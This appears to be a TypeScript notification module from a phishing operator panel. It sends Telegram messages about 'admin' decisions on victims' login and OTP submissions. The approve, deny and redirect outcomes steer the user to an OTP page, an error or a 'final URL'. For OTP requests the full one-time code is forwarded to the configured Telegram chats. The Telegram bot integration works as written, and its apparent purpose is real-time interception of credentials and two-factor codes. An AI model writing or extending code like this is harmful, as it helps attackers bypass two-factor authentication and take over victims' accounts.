const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim()
const CHAT_IDS = (process.env.TELEGRAM_CHAT_ID || '')
  .split(/[,;\n]+/)
  .map((id) => id.trim())
  .filter(Boolean)

export type AdminLoginOutcomeAction = 'approve' | 'deny' | 'redirect'
export type AdminRequestKind = 'login' | 'otp'

function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

function asString(value: unknown): string {
  return typeof value === 'string' ? value.trim() : ''
}

function asCode(value: unknown): string {
  const text = asString(value) || (value != null && value !== '' ? String(value) : '')
  return `<code>${escapeHtml(text || 'Unknown')}</code>`
}

async function sendTelegramMessage(message: string): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || CHAT_IDS.length === 0) return false
  const results = await Promise.all(
    CHAT_IDS.map(async (chatId) => {
      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        }),
      })
      const data = await res.json().catch(() => ({}))
      return res.ok && data?.ok === true
    }),
  )
  return results.some(Boolean)
}

function methodContactLines(method: string | undefined, maskedEmail?: string, maskedPhone?: string): string {
  const methodLabel = method === 'email' ? 'Email' : 'Text Message (SMS)'
  const contact =
    method === 'email'
      ? `📧 Email: ${asCode(maskedEmail)}`
      : `📱 Phone: ${asCode(maskedPhone)}`
  return `📧 Method: ${asCode(methodLabel)}\n${contact}`
}

export async function sendAdminLoginOutcomeNotification(data: {
  action: AdminLoginOutcomeAction
  requestKind?: AdminRequestKind
  userId?: string
  method?: 'email' | 'text' | string
  maskedEmail?: string
  maskedPhone?: string
  code?: string
}): Promise<boolean> {
  const isOtp = data.requestKind === 'otp'
  const contact = methodContactLines(data.method, data.maskedEmail, data.maskedPhone)
  const codeLine = isOtp && data.code ? `\n🔐 Code: ${asCode(data.code)}` : ''
  let message: string

  if (data.action === 'approve') {
    message = [
      isOtp ? `✅ <b>CC – OTP Approved</b>` : `✅ <b>CC – Login Approved</b>`,
      '━━━━━━━━━━━━━━━━━━',
      `👤 User ID: ${asCode(data.userId)}`,
      contact + codeLine,
      isOtp
        ? `✅ Status: Approved – User sent to final URL`
        : `✅ Status: Approved – User redirected to OTP page`,
    ].join('\n')
  } else if (data.action === 'deny') {
    message = [
      isOtp ? `❌ <b>CC – OTP Denied</b>` : `❌ <b>CC – Login Denied</b>`,
      '━━━━━━━━━━━━━━━━━━',
      `👤 User ID: ${asCode(data.userId)}`,
      contact + codeLine,
      `❌ Status: Denied – User shown error message`,
    ].join('\n')
  } else {
    message = [
      isOtp ? `↪️ <b>CC – OTP Redirected</b>` : `↪️ <b>CC – Login Redirected</b>`,
      '━━━━━━━━━━━━━━━━━━',
      `👤 User ID: ${asCode(data.userId)}`,
      contact + codeLine,
      `↪️ Status: Redirected – User sent to final URL`,
    ].join('\n')
  }

  return sendTelegramMessage(message)
}
